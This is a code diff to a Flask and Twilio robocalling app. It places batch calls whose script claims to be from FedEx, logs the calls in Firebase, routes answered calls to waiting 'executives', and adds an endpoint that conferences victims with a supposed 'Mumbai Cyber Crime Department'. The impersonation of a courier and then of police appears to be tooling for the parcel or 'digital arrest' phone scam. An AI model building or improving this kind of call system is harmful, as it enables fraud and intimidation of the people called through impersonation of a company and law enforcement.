@@ -35,7 +35,7 @@ if not firebase_admin._apps:
 
 app = Flask(__name__)
 
-RUN_URL = 'https://major-publicly-ape.ngrok-free.app/'
+RUN_URL = 'https://9eac-115-99-91-205.ngrok-free.app/'
 
 # Twilio Credentials
 account_sid = os.getenv('TWILIO_SDK_SID')
@@ -53,12 +53,15 @@ initial_message = 'This is calling from Fedex international courier service. You
 hold_message = 'Please wait while we are transferring the call to FedEx international courier service.'
 transfer_message = 'This call has been transferred to the Mumbai Cyber Crime Department.'
 from_phone_numbers = [
-    '+19045724924'
+    '+15163364128'
 ]
 
 @app.route('/')
 def index():
     return render_template('index.html')
+@app.route('/manage-call')
+def manage_call():
+    return render_template('manageCall.html')
 
 @app.route('/make-call', methods=['POST'])
 def make_call():
@@ -90,10 +93,11 @@ def make_call():
             )
 
             calllogs_ref.child(call.sid).set({
-                'receiver': phone,
+                'receiver': to,
                 'from': from_number,
                 'executive': free_executive,
                 'status': 'ongoing',
+                'sid': call.sid,
             })
 
             time.sleep(interval / 1000)
@@ -135,7 +139,7 @@ def gather_response():
         if free_executive:
             # Dial the executive and wait for their input
             mark_executive_busy(free_executive, True)
-            dial = Dial(action='/ongoing-call')  # Change the action to ongoing-call
+            dial = Dial()  # Change the action to ongoing-call
             dial.number(free_executive)
             response.append(dial)
             response.play('https://firebasestorage.googleapis.com/v0/b/chicken-stew.appspot.com/o/627275__tyops__calm-and-sad-%5BAudioTrimmer.com%5D.wav?alt=media&token=9911d20b-1924-4d24-86c2-59f78d161d5e')
@@ -150,38 +154,48 @@ def gather_response():
 
     return Response(str(response), mimetype='text/xml')
 
-@app.route('/ongoing-call', methods=['POST'])
-def ongoing_call():
-    """Handles the ongoing call between customer and executive."""
-    response = VoiceResponse()
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    sid = request.json.get('sid')
+    if not sid:
+        return jsonify({"error": "Missing 'sid' in the request body."}), 400
 
-    # Inform the executive they are connected with the customer
-    response.say("You are now connected with the customer. Press 00 to transfer this call to the Mumbai Cyber Crime Department.", voice='alice')
-    
-    # Gather input from the customer care executive
-    gather = Gather(num_digits=2, action='/transfer-response', method='POST', timeout=30)  # Extended timeout
-    response.append(gather)
-
-    return Response(str(response), mimetype='text/xml')
+    try:
+        client.calls(sid).update(url=RUN_URL + "/transfer-response")
+        return jsonify({"message": "Call transfer initiated."}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/transfer-response', methods=['POST'])
 def transfer_response():
     """Handles the transfer to the Cyber Crime Department."""
-    digits = request.form.get('Digits')
     response = VoiceResponse()
-
-    if digits == '00':
-        response.say(transfer_message)
-        free_crime_exec = find_free_crime_executive()
-        if free_crime_exec:
-            response.dial(free_crime_exec)
-        else:
-            response.say('No available crime executives. Ending call.')
-    else:
-        response.say('No transfer detected. Ending call.')
+    free_crime_exec = find_free_crime_executive()
     
-    response.hangup()
+    if free_crime_exec:
+        # Create a conference
+        conference_name = 'CrimeDepartmentConference'
+        response.dial().conference(conference_name)
+        response.say("You are now connected with the Cyber Crime Department.")
+        
+        client.calls.create(
+            to=free_crime_exec,
+            from_=from_phone_numbers[0],
+            url=RUN_URL + '/conference-join'
+        )
+    else:
+        response.say("No available crime executives at the moment. Please try again later.")
+    
     return Response(str(response), mimetype='text/xml')
+
+@app.route('/conference-join', methods=['POST'])
+def conference_join():
+    """Joins the crime executive into the conference."""
+    response = VoiceResponse()
+    response.dial().conference('CrimeDepartmentConference')
+    return Response(str(response), mimetype='text/xml')
+
+
 
 @app.route('/completed-call', methods=['POST'])
 def completed_call():
